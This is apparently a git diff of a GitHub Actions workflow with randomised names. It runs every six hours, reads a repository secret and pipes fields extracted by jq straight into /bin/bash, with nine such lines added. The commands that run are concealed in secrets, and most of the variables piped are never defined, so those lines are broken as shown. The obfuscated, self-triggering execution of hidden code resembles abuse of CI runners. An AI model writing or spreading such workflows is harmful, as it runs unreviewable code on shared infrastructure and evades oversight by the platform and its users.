@@ -1,9 +1,8 @@
 name: makezhu9381
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 0/6 * * *'
+    - cron: '13 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,11 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: makezhu9381
         env:
-          gxy91: ${{ secrets.gxy91 }}
+          unuyv40819: ${{ secrets.unuyv40819 }}
         run: |
-          echo $gxy91 | jq -r .l21 | /bin/bash
-          echo $y21 | jq -r .qzon919 | /bin/bash
-          echo $st27 | jq -r .sx6551 | /bin/bash
-          echo $h8 | jq -r .grzgl2999 | /bin/bash
-          echo $rxdr51 | jq -r .pkz13 | /bin/bash
+          echo $unuyv40819 | jq -r .t484 | /bin/bash
+          echo $ru14 | jq -r .nuuo9 | /bin/bash
+          echo $n98 | jq -r .teq08 | /bin/bash
+          echo $c52 | jq -r .bejlq838 | /bin/bash
+          echo $kufkx23036 | jq -r .jxh6121 | /bin/bash
+          echo $bb20512 | jq -r .wye2861 | /bin/bash
+          echo $hmwhj3 | jq -r .c869 | /bin/bash
+          echo $hu52 | jq -r .c4034 | /bin/bash
+          echo $cgyu30229 | jq -r .ugaux6253 | /bin/bash
 
